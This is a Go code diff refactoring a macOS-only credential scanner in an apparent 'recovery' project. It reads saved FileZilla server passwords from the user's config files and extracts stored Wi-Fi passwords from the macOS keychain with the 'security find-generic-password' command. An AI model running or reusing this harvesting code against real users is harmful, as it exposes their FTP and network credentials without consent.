@@ -1,4 +1,4 @@
-//go:build !windows
+//go:build darwin
 
 package scanner
 
@@ -7,7 +7,6 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
-	"runtime"
 	"strings"
 
 	"recovery/recovery/types"
@@ -15,14 +14,12 @@ import (
 
 func ScanApps() []types.AppCredentialResult {
 	var results []types.AppCredentialResult
-	results = append(results, scanFileZillaUnix()...)
-	if runtime.GOOS == "darwin" {
-		results = append(results, scanWiFiDarwin()...)
-	}
+	results = append(results, scanFileZilla()...)
+	results = append(results, scanWiFi()...)
 	return results
 }
 
-type fzServerUnix struct {
+type fzServer struct {
 	XMLName  xml.Name `xml:"Server"`
 	Host     string   `xml:"Host"`
 	Port     int      `xml:"Port"`
@@ -31,17 +28,17 @@ type fzServerUnix struct {
 	Pass     string   `xml:"Pass"`
 }
 
-type fzSiteManagerUnix struct {
-	XMLName xml.Name       `xml:"FileZilla3"`
-	Servers []fzServerUnix `xml:"Servers>Server"`
+type fzSiteManager struct {
+	XMLName xml.Name   `xml:"FileZilla3"`
+	Servers []fzServer `xml:"Servers>Server"`
 }
 
-type fzRecentServersUnix struct {
-	XMLName xml.Name       `xml:"FileZilla3"`
-	Servers []fzServerUnix `xml:"RecentServers>Server"`
+type fzRecentServers struct {
+	XMLName xml.Name   `xml:"FileZilla3"`
+	Servers []fzServer `xml:"RecentServers>Server"`
 }
 
-func scanFileZillaUnix() []types.AppCredentialResult {
+func scanFileZilla() []types.AppCredentialResult {
 	var results []types.AppCredentialResult
 	home, _ := os.UserHomeDir()
 	if home == "" {
@@ -49,10 +46,6 @@ func scanFileZillaUnix() []types.AppCredentialResult {
 	}
 
 	fzDir := filepath.Join(home, ".config", "filezilla")
-	if runtime.GOOS == "darwin" {
-		fzDir = filepath.Join(home, ".config", "filezilla")
-	}
-
 	for _, file := range []string{"sitemanager.xml", "recentservers.xml"} {
 		path := filepath.Join(fzDir, file)
 		data, err := os.ReadFile(path)
@@ -60,14 +53,14 @@ func scanFileZillaUnix() []types.AppCredentialResult {
 			continue
 		}
 
-		var servers []fzServerUnix
+		var servers []fzServer
 		if file == "sitemanager.xml" {
-			var sm fzSiteManagerUnix
+			var sm fzSiteManager
 			if xml.Unmarshal(data, &sm) == nil {
 				servers = sm.Servers
 			}
 		} else {
-			var rs fzRecentServersUnix
+			var rs fzRecentServers
 			if xml.Unmarshal(data, &rs) == nil {
 				servers = rs.Servers
 			}
@@ -102,24 +95,18 @@ func scanFileZillaUnix() []types.AppCredentialResult {
 	return results
 }
 
-func scanWiFiDarwin() []types.AppCredentialResult {
-	var results []types.AppCredentialResult
-
+func scanWiFi() []types.AppCredentialResult {
 	out, err := exec.Command("/usr/sbin/networksetup", "-listpreferredwirelessnetworks", "en0").Output()
 	if err != nil {
 		return nil
 	}
 
-	var networks []string
+	var results []types.AppCredentialResult
 	for _, line := range strings.Split(string(out), "\n") {
 		name := strings.TrimSpace(line)
 		if name == "" || strings.HasPrefix(name, "Preferred networks") {
 			continue
 		}
-		networks = append(networks, name)
-	}
-
-	for _, name := range networks {
 		pw, err := exec.Command("security", "find-generic-password", "-wa", name, "-D", "AirPort network password").Output()
 		password := ""
 		if err == nil {
@@ -132,6 +119,5 @@ func scanWiFiDarwin() []types.AppCredentialResult {
 			Protocol:    "wifi",
 		})
 	}
-
 	return results
 }
